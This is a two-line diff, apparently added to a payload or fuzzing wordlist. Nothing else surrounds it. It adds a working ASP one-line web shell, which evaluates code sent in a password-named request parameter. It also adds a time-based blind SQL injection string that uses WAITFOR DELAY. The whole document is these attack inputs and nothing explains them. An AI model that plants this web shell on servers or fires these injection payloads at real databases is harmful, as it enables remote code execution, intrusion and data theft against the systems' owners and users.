@@ -1,0 +1,2 @@
+ <%eval request("yjzyxx!")%> 
+')waitfor delay'0:0:20'--
